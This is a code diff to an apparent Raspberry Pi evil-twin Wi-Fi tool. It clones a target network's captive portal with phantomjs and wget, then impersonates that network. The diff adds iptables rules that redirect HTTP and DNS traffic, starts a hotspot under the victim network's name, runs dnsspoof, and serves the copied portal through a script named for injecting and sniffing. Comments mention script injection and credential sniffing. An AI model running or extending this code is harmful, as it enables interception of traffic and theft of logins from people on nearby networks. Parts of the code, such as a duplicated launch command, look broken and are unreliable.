@@ -37,14 +37,12 @@ if len(old_networks) > 0:
     for network in old_networks: #print all old ones with nr's before them.
         print(str(counter)+") "+network.replace(".conf",""))
         counter=counter+1
-    print("")
     print("Give a nr of a network you want to use or")
 else:
     print("[INFO]NO COPIED NETWORKS")
 
 print("Give '0' to copy a new non-profiled network or type anything else to quit:") #Give input option 0 for create new, and add all the other ones, q = quit
 answer=input()
-print("");
 
 ###COPYING
 if answer == "0":
@@ -91,7 +89,6 @@ if answer == "0":
         if counter != 1:
             print("Give the number of the network you want to copy, or leave empty to scan again:")
             answer=input()
-            print("")
 
             if is_number(answer):
                 if int(answer) < counter:
@@ -185,63 +182,68 @@ if answer == "0":
         #copy
         print("press <ENTER> to go through with downloading the served website(captive portal), this could take multiple tries)") #Give input option 0 for create new, and add all the other ones, q = quit
         answer=input()
-        print("")
-        while 1:
-            print("Copy www.google.com (or the captive portal and save it to copied_sites/")
 
-            directory="copied_sites"
-            p = Popen("mkdir "+directory+" && touch "+directory+"/.gitignore", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-            for line in p.stdout.read().splitlines():
-                print(line.decode("utf-8"))
-            p.communicate()
-            #set basic url
-            url="http://www.google.com"
-            savename=target_essid+".AP"
-            #delete previous
-            p = Popen("rm -Rf "+directory+"/"+url+" && rm -Rf "+directory+"/temp_wget", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-            for line in p.stdout.read().splitlines():
-                print(line.decode("utf-8"))
-            p.communicate()
-
-            #render javascript of website
-            p = Popen("QT_QPA_PLATFORM=offscreen phantomjs resources/get_redirection_url_phantomjs.js "+url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        ##PHANTOMJS
+        success=False
+        while not(success):
+            print("Retrieving final redirection link...")
+            p = Popen("QT_QPA_PLATFORM=offscreen phantomjs resources/get_redirection_url_phantomjs.js http://www.google.com", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
             redirected_url=""
             for line in p.stdout.read().splitlines():
+                success=True
                 redirected_url=line.decode("utf-8").rstrip()
+                if line.decode("utf-8").rstrip() == "failed":
+                    success=False
+                    print("Failed, Retry? (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
+                    answer=input()
+                    if answer == "n":
+                        exit()
             p.communicate()
 
-            #download file
-            print('downloading with wget')
-            print(redirected_url)
-            #p = Popen("cd copied_sites && wget -c -N -mkEpnp -l 1 --max-redirect=100 -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-            #p = Popen("cd copied_sites && wget -mkEpnp -l 1 --max-redirect=100 -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-            p = Popen("cd copied_sites && wget -kEpnp -l 1 --max-redirect=100 -e robots=off -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        ##WGET DOWNLOAD
+        directory="copied_sites"
+        savename=target_essid+".AP"
+
+        print("Making the folder copied_sites...")
+        p = Popen("mkdir "+directory+" && touch "+directory+"/.gitignore", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        p.communicate()
+
+        while not(success):
+            #delete previous folder and delete temp_wget
+            print("Clean up previous temporary files...")
+            p = Popen("rm -Rf "+directory+"/temp_wget", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            p.communicate()
+
+            print('Downloading link main page with wget (+page-req, etc)...')
+            p = Popen("cd copied_sites && wget -kEpnp -l 1 --max-redirect=100 --user-agent='Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36' -e robots=off -P temp_wget "+redirected_url, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
             for line in p.stdout.read().splitlines():
                 print(line.decode("utf-8"))
             p.communicate()
-            
-            if os.path.exists(directory+"/temp_wget") and len(os.listdir(directory+"/temp_wget")) > 0:
-                print('exists')
-                # file exists
-                redirects=False
-                redirect_url=""
-                #TODO rename to savename
-                p = Popen("rm -Rf "+directory+"/"+savename+" && mv "+directory+"/temp_wget/* "+directory+"/"+savename, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
-                for line in p.stdout.read().splitlines():
-                    print(line.decode("utf-8"))
-                p.communicate()
 
-                print("Download succeeded")
-                spoof_essid=target_essid
+            print("Did the above output completely succeed? Do you want to repeat (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
+            answer=input()
+            if answer == "n":
                 break
-            else:
-                print("Failed, Unable to get a web page from AP (captive portal?)")
-                print("Retry? (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
-                answer=input()
-                print("")
-                if answer == "n":
-                    exit()
-                time.sleep(1)
+            
+        print("Copying temporary saved files into a usable folder...")
+        p = Popen("rm -Rf "+directory+"/"+savename, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        p.communicate()
+        redirected_filepath=redirected_url.replace("https://:","").replace("http://","")
+        p = Popen("mkdir "+directory+"/"+savename, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        p.communicate()
+        if redirected_filepath[-1] != "/":
+            #FILE
+            print("Rename to index file...")
+            p = Popen("mv "+directory+"/temp_wget/"+redirected_filepath+" "+directory+"/"+savename+"/index.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+            for line in p.stdout.read().splitlines():
+                print(line.decode("utf-8"))
+            p.communicate()
+        print("Copy resources...")
+        p = Popen("mv "+directory+"/temp_wget/"+redirected_filepath.rsplit("/","")[0]+"/* "+directory+"/"+savename+"/", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        for line in p.stdout.read().splitlines():
+            print(line.decode("utf-8"))
+        p.communicate()
+        spoof_essid=target_essid
 elif is_number(answer):
     if int(answer)-1 < len(old_networks):
         spoof_essid=old_networks[int(answer)-1].replace(".conf","")
@@ -254,9 +256,9 @@ else:
     print("Quiting...")
     exit()
 
-
 ###SPOOFING
 #spoof_essid contains the essid -> .conf file in directory can have the full profile (TODO), captive portal is coppied with <essid>.copied
+
 print("Preparing to spoof '"+spoof_essid+"' ...")
 spoof_options={}
 # print the selected profile, if there is a captive portal for it etc
@@ -272,7 +274,6 @@ if int(output) > 0:
     print("Copied site for this AP present!")
     print("Do you want to use it as a captive portal for the spoofed network? (Y/n):") #Give input option 0 for create new, and add all the other ones, q = quit
     answer=input()
-    print("")
     if answer != "n":
         spoof_options["use_captive_portal"]=True
 else:
@@ -280,8 +281,6 @@ else:
 
 #TODO ask here for extra attacks
 #TODO ask if inject scripts (which ones,)
-#TODO ask if check for creds flying over the air urlsnarf? -> log to a file
-#TODO make a folder with the captive portal and the injected file inserted into it.
 
 # ask to spoof now
 print("Do you want to start spoofing with the following options?") #Give input option 0 for create new, and add all the other ones, q = quit
@@ -292,32 +291,42 @@ print("(Y/n): ")
 answer=input()
 print("")
 
-#folliwing all in one commnad? popeeN?
-#start up hostapd with all the settings (maybe bssid) -> use external script 
-#TODO more spoofing options?
+#TODO run the following depending on options 
 
-#reroute
+print("Rerouting to webserver...")
 p = Popen("sudo iptables -F && sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 9000", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in p.stdout.read().splitlines():
     if debug: 
         print("[DEBUG]"+line.decode("utf-8"))
 
+#reroute DNS
+print("Rerouting DNS...")
 p = Popen("iptables -A INPUT -i wlan0 -p udp --dport 53 -j ACCEPT && iptables -A PREROUTING -t nat -i wlan0 -p udp --dport 53 -j REDIRECT --to-port 53", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in p.stdout.read().splitlines():
     if debug: 
         print("[DEBUG]"+line.decode("utf-8"))
+
 #setup inject.html
+print("Creating tmp/inject.html...")
 p = Popen("rm tmp/inject.html && touch tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in p.stdout.read().splitlines():
     if debug: 
         print("[DEBUG]"+line.decode("utf-8"))
+
 #setup SERVE folder
-p = Popen("rm -Rf tmp/SERVE && mkdir tmp/SERVE && cp copied_sites/"+spoof_essid+".AP/* tmp/SERVE/", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+print("Filling tmp/SERVE with the copied portal...")
+p = Popen("rm -Rf tmp/SERVE && mkdir tmp/SERVE && cp -R copied_sites/"+spoof_essid+".AP/* tmp/SERVE/", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in p.stdout.read().splitlines():
     if debug: 
         print("[DEBUG]"+line.decode("utf-8"))
 
+print("Starting hotspot...")
 p = Popen("sh /home/pi/HackOTG/hotspot_start.sh "+spoof_essid+" && sudo dnsspoof -i wlan0 port 53 1>/dev/null 2>/dev/null& nodejs serve_inject_sniff.js tmp/SERVE/ tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+for line in iter(p.stdout.readline, ""):
+        print('\r'+line[:-1].decode("utf-8"))
+
+print("Starting dnsserver and webserver...")
+p = Popen("sudo dnsspoof -i wlan0 port 53 1>/dev/null 2>/dev/null& nodejs serve_inject_sniff.js tmp/SERVE/ tmp/inject.html", shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
 for line in iter(p.stdout.readline, ""):
         print('\r'+line[:-1].decode("utf-8"))
 
